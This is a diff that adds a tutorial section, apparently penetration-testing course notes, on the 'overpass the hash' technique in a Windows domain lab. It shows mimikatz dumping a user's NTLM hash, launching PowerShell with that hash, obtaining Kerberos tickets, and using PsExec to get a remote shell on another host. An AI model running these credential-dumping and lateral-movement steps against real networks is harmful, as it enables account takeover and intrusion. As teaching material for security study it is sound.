@@ -209,9 +209,153 @@ C:\Windows\system32>
 
 NTLM to --> Kerberos TGT ticket
 
-With overpass the hash,673 we can “over” abuse a NTLM user hash to gain a full Kerberos Ticket Granting Ticket (TGT) or service ticket, which grants us access to another machine or service as that user.
+With overpass the hash, we can “over” abuse a NTLM user hash to gain a full Kerberos Ticket Granting Ticket (TGT) or service ticket, which grants us access to another machine or service as that user.
+
+{% code title="Dumping password hash for 'jen'" overflow="wrap" lineNumbers="true" %}
+```
+mimikatz # privilege::debug
+Privilege '20' OK
+mimikatz # sekurlsa::logonpasswords
+
+...
+Authentication Id : 0 ; 1142030 (00000000:00116d0e)
+Session           : Interactive from 0
+User Name         : jen
+Domain            : CORP
+Logon Server      : DC1
+Logon Time        : 2/27/2023 7:43:20 AM
+SID               : S-1-5-21-1987370270-658905905-1781884369-1124
+        msv :
+         [00000003] Primary
+         * Username : jen
+         * Domain   : CORP
+         * NTLM     : 369def79d8372408bf6e93364cc93075
+         * SHA1     : faf35992ad0df4fc418af543e5f4cb08210830d4
+         * DPAPI    : ed6686fedb60840cd49b5286a7c08fa4
+        tspkg :
+        wdigest :
+         * Username : jen
+         * Domain   : CORP
+         * Password : (null)
+        kerberos :
+         * Username : jen
+         * Domain   : CORP.COM
+         * Password : (null)
+        ssp :
+        credman :
+...
+```
+{% endcode %}
+
+{% code title="Creating a process with a different user's NTLM password hash" overflow="wrap" lineNumbers="true" %}
+```
+mimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell 
+user    : jen
+domain  : corp.com
+program : powershell
+impers. : no
+NTLM    : 369def79d8372408bf6e93364cc93075
+  |  PID  8716
+  |  TID  8348
+  |  LSA Process is now R/W
+  |  LUID 0 ; 16534348 (00000000:00fc4b4c)
+  \_ msv1_0   - data copy @ 000001F3D5C69330 : OK !
+  \_ kerberos - data copy @ 000001F3D5D366C8
+   \_ des_cbc_md4       -> null
+   \_ des_cbc_md4       OK
+   \_ des_cbc_md4       OK
+   \_ des_cbc_md4       OK
+   \_ des_cbc_md4       OK
+   \_ des_cbc_md4       OK
+   \_ des_cbc_md4       OK
+   \_ *Password replace @ 000001F3D5C63B68 (32) -> null
+```
+{% endcode %}
+
+{% hint style="info" %}
+At this point, running the whoami command on the newly created PowerShell session would show jeff's identity instead of jen. While this could be confusing, this is the intended behavior of the whoami utility which only checks the current process's token and does not inspect any imported Kerberos tickets
+{% endhint %}
+
+{% code title="Listing Kerberos tickets" overflow="wrap" lineNumbers="true" %}
+```
+PS C:\Windows\system32> klist
+
+Current LogonId is 0:0x1583ae
+
+Cached Tickets: (0)
+```
+{% endcode %}
+
+{% code title="Mapping a network share on a remote server" overflow="wrap" lineNumbers="true" %}
+```
+PS C:\Windows\system32> net use \\files04
+The command completed successfully.
+```
+{% endcode %}
+
+{% code title="Listing Kerberos tickets" overflow="wrap" lineNumbers="true" %}
+```
+PS C:\Windows\system32> klist
+
+Current LogonId is 0:0x17239e
+
+Cached Tickets: (2)
+
+#0>     Client: jen @ CORP.COM
+        Server: krbtgt/CORP.COM @ CORP.COM
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
+        Start Time: 2/27/2023 5:27:28 (local)
+        End Time:   2/27/2023 15:27:28 (local)
+        Renew Time: 3/6/2023 5:27:28 (local)
+        Session Key Type: RSADSI RC4-HMAC(NT)
+        Cache Flags: 0x1 -> PRIMARY
+        Kdc Called: DC1.corp.com
+
+#1>     Client: jen @ CORP.COM
+        Server: cifs/files04 @ CORP.COM
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
+        Start Time: 2/27/2023 5:27:28 (local)
+        End Time:   2/27/2023 15:27:28 (local)
+        Renew Time: 3/6/2023 5:27:28 (local)
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+        Cache Flags: 0
+        Kdc Called: DC1.corp.com
+
+```
+{% endcode %}
+
+We know that ticket #0 is a TGT because the server is krbtgt.
+
+{% hint style="info" %}
+We used net use arbitrarily in this example, but we could have used any command that requires domain permissions and would subsequently create a TGS.
+{% endhint %}
+
+We have now converted our NTLM hash into a Kerberos TGT, allowing us to use any tools that rely on Kerberos authentication (as opposed to NTLM). Here we will use the official PsExec application from Microsoft.
+
+PsExec can run a command remotely but does not accept password hashes. Since we have generated Kerberos tickets and operate in the context of jen in the PowerShell session, we can reuse the TGT to obtain code execution on the files04 host.
+
+{% code title="Opening remote connection using Kerberos" overflow="wrap" lineNumbers="true" %}
+```
+PS C:\Windows\system32> cd C:\tools\SysinternalsSuite\
+PS C:\tools\SysinternalsSuite> .\PsExec.exe \\files04 cmd
+
+PsExec v2.4 - Execute processes remotely
+Copyright (C) 2001-2022 Mark Russinovich
+Sysinternals - www.sysinternals.com
 
 
+Microsoft Windows [Version 10.0.20348.169]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+corp\jen
+
+C:\Windows\system32>hostname
+FILES04
+```
+{% endcode %}
 
 ## Pass the ticket
 
